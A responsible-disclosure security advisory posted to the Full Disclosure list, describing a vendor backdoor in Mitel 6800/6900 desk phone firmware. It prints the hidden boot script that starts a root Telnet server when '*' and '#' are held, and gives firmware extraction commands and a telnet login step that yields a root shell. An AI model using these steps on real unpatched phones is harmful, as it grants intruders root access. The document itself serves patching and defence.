@@ -1,0 +1,266 @@
+
+Date: Fri, 10 Jun 2022 11:11:50 +0200
+From: Moritz Abrell <moritz.abrell@...s.de>
+To: <fulldisclosure@...lists.org>
+Subject: [FD] Hidden Functionality (Backdoor) (CWE-912) / CVE-2022-29854,
+ CVE-2022-29855
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+Advisory ID:               SYSS-2022-021
+Product:                   Mitel 6800/6900 Series SIP Phones excluding 6970
+                            Mitel 6900 Series IP (MiNet) Phones
+Manufacturer:              Mitel Networks Corporation
+Affected Version(s):       Rel 5.1 SP8 (5.1.0.8016) and earlier
+                            Rel 6.0 (6.0.0.368) to 6.1 HF4 (6.1.0.165)
+                            MiNet 1.8.0.12 and earlier
+Tested Version(s):         6.1.0.146
+Vulnerability Type:        Hidden Functionality (Backdoor) (CWE-912)
+Risk Level:                High
+Solution Status:           Fixed
+Manufacturer Notification: 2022-02-23
+Solution Date:             2022-05-03
+Public Disclosure:         2022-06-10
+CVE Reference:             CVE-2022-29854
+                            CVE-2022-29855
+Author of Advisory:        Moritz Abrell, SySS GmbH
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+Mitel Networks Corporation manufactures different IP- and SIP-based
+desk phones.
+
+The manufacturer describes these products, e.g., as follows:
+
+"The 6900 IP Series is a powerful suite of desk phones with crystal clear
+audio, advanced features and a broad array of accessories to improve
+productivity and mobility in today's modern business environment."
+
+The firmware of several phones contains an undocumented backdoor which
+allows an attacker to gain root access by pressing specific keys on
+system boot.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+The shell script "check_mft.sh", which is located in the directory
+"/etc" on the phone, checks whether the keys "*" and "#" are pressed
+simultaneously during system startup.
+
+The phone then sets its IP address to "10.30.102.102" and starts a
+Telnet server. A Telnet login can then be performed with a static root
+password.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+1. Identify the backdoor
+
+1.1. Extract the jffs2 file system from an affected Mitel firmware:
+
+#> binwalk -e 6867i.st
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+- --------------------------------------------------------------------------------
+347           0x15B           Linux kernel ARM boot executable zImage (little-endian)
+15695         0x3D4F          gzip compressed data, maximum compression, from Unix, last modified: 2021-10-22 10:47:08
+1223395       0x12AAE3        JFFS2 filesystem, little endian
+
+
+1.2. Mount the jffs2 file system:
+
+#> modprobe jffs2
+#> modprobe mtdram total_size=70000
+#> modprobe mtdblock
+#> dd if=12AAE3.jffs2 of=/dev/mtdblock0
+#> mount -t jffs2 /dev/mtdblock0 /mnt/
+
+
+1.3. The script "check_mft.sh" located in the "/etc" directory contains
+the backdoor logic:
+
+#> cat /mnt/etc/check_mft.sh
+************* content shortened ****************
+#!/bin/sh
+
+case "$HOSTNAME" in
+
+#press and hold *  # two keys at the same time
+     
+      "bcm911109_6867i" | "6867i" | "bcm911107_praxis_3" |  "bcm911109_aquarius_3")
+         GPIODetect=`gpio get 4`
+         checkDhsgShorted
+         #KEY_OUT0 (GPIO52)  -> KEY_IN7 (GPIO50)  "DownKey" is press
+         isCCATest=`dbg rw 0x8000d000 8| grep "0x8000d000: 01ff 017f 01ff 01ff 01ff 01ff 01ff 01ff"`
+         
+         keyBoardScanMatch="True"
+         keycombinationMatch=`dbg rw 0x8000d000 8| grep "0x8000d000: 01ff 01ff 01ff 01ff 01af 01ff 01ff 01ff"`
+     ;;
+esac
+
+echo "keyBoardScanMatch = $keyBoardScanMatch,  dhsgShorted=$dhsgShorted "
+echo "GPIODetect = $GPIODetect,keycombinationMatch=$keycombinationMatch"
+echo "isCCATest = $isCCATest"
+
+if [ "$keyBoardScanMatch" -a $dhsgShorted -eq 1 -a $GPIODetect -eq "0" -o  "$keycombinationMatch" ]; then
+     mount -t jffs2 /dev/mtdblock3 /nvdata
+     if [ -f $ENETCFG ]; then
+         . $ENETCFG
+         MAC=${ENETCFG_MAC}
+     fi
+
+     /etc/if_bcm_net_setup.sh up
+     ifconfig eth0 hw ether $MAC
+     ifconfig eth0 10.30.102.102 netmask 255.255.255.0 up
+     
+     if [ -f /usr/sbin/telnetd ]; then
+          telnetd &
+     fi
+     exit 255
+fi
+************* content shortened ****************
+
+
+1.4. The file "ota_BCM911109_PRAXIS_3_voice_v6_5_jffs2.bin" located in
+the directory "/etc" contains another jffs2 file system.
+
+
+1.5. Extract and mount the file system as described in Steps 1
+and 2.
+
+
+1.6. The "check_mft.sh" in this file system also contains the root
+password which is set by default and forced by the script:
+
+#> cat /mnt/etc/check_mft.sh
+************* content shortened ****************
+if [ -f /usr/sbin/telnetd ]; then
+# make sure the default password is set for root.
+     (echo (password stripped out); sleep 1; echo (password stripped out) | passwd -a A
+     telnetd &
+fi
+************* content shortened ****************
+
+
+2. Exploiting
+
+2.1. Boot the phone and press the "*" and "#" keys simultaneously.
+
+
+2.2. Assign an IP address to communicate with the phone:
+
+#> ip addr add 10.30.102.100/24 dev eth0
+
+
+2.3. Now, logging in to the phone as the root user with the static password
+via Telnet is possible:
+
+#> telnet 10.30.102.102
+Trying 10.30.102.102...
+Connected to 10.30.102.102.
+Escape character is '^]'.
+
+(none) login: root
+Password:
+10.30.102.102 # id
+uid=0(root) gid=0(root) groups=0(root)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+Upgrade to one of the following (or later) versions:
+- - 5.1 SP8 HF1 (5.1.0.8017)
+- - 6.1 HF5 (6.1.0.171)
+- - 6.2 SP1 (6.2.0.1012)
+- - MiNet 1.8.0.15
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2022-02-22: Vulnerability discovered
+2022-02-23: Vulnerability reported to manufacturer
+2022-02-24: Acknowledgement of receipt of the vulnerability report
+             received from the manufacturer
+2022-03-30: Consultation with the manufacturer regarding updates to fix
+             the vulnerability
+2022-03-30: Manufacturer confirms the vulnerability, informs about the
+             status to fix the vulnerability and asks for an extension of
+             the disclosure timeline
+2022-03-31: New disclosure date set to 2022-05-10
+2022-05-04: Asking the manufacturer for any updates regarding the
+             vulnerability
+2022-05-05: Manufacturer provides a patch to fix this vulnerability
+2022-05-05: Manufacturer publishes the vulnerability and assigned CVE IDs
+2022-05-05: Manufacturer asks for another extension of the disclosure
+             timeline, as large parts of the phones may still be unpatched
+             in practice
+2022-05-05: New disclosure date set to 2022-06-10
+2022-06-10: Public disclosure of the vulnerability
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+References:
+
+[1] Product website for Mitel IP desk phones:
+     https://www.mitel.com/products/devices-accessories/ip-phones-peripherals
+[2] SySS Responsible Disclosure Policy:
+     https://www.syss.de/en/responsible-disclosure-policy
+[3] Vulnerability reports by the manufacturer:
+     https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-22-0004
+     https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-22-0003
+[4] CVE-2022-29854:
+     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29854
+[5] CVE-2022-29855:
+     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29855
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Credits:
+
+This security vulnerability was found by Moritz Abrell of SySS GmbH.
+
+E-Mail:moritz.abrell@...s.de
+Public Key:https://www.syss.de/fileadmin/dokumente/PGPKeys/Moritz_Abrell.asc
+Key Fingerprint: 2927 7EB6 1A20 0679 79E9  87E6 AE0C 9BF8 F134 8B53
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclaimer:
+
+The information provided in this security advisory is provided "as is"
+and without warranty of any kind. Details of this security advisory may
+be updated in order to provide as accurate information as possible. The
+latest version of this security advisory is available on the SySS website.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Copyright:
+
+Creative Commons - Attribution (by) - Version 3.0
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCgAdFiEEKSd+thogBnl56Yfmrgyb+PE0i1MFAmKaIVcACgkQrgyb+PE0
+i1O5fA/9H7onaudE9cqHwqBf0cjdXczlo2e52XXIvcX7NdxQ7HAPuo3kXAeHQCg4
+0IlP2MB8rTBLtEJf43ZJhqDuK2J+Q6ypsVrmAzvCBYswsJjFH2SKYkS9cIx3CSaw
+35G+J578oYQMex0fZJGK3vYGBPtTIoXhW3Gb4rdG41o6lhKQ3ELF04/9CQTUpKao
+llCYe3zOhmacnpJ93w5aCenEPqJnrOy0w1bguQN6j43cEnGyv7hVIwW4ukQ4yTvz
+iBjoRBx89VdjEQKb7g52D6pnORT48vgkDNXZcowofKtD1LZxPz6fC+cuBabSJz41
+MFObTqfW9tYTVsBAuqIlQWavp3sy1Jenh/wb9gHILVXupv5flux2ffuKZPyDg6dq
+dh66GXJaXEX0cWuUax8z6nj6l0nWOcjmbo07Ad1rox8bSOffSvtNRxEgij8tjwPg
+UpWD6sofHid9BhGWJpyziBRvADDYSakohHZA+GCNONopVwhJdE+RrfOWaD1HV7jn
+V+RI1ZmB1MYSDHKK11sfYpIFn1qdvF3l0hM0YVjxcy2iNn/cR9ZnId0wtRK4mVhx
+wx5XBltwHMBREPgNUnqAmsAuAOitt7+vHdVpWA0/0A1vjJnFfdDy2rSiNoDRysrE
+jp76E0iYjNPWdtJE67Q449Vwk6RINH7C+sSMbAQq5WfY336TyNQ=
+=jFCk
+-----END PGP SIGNATURE-----
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: https://seclists.org/fulldisclosure/
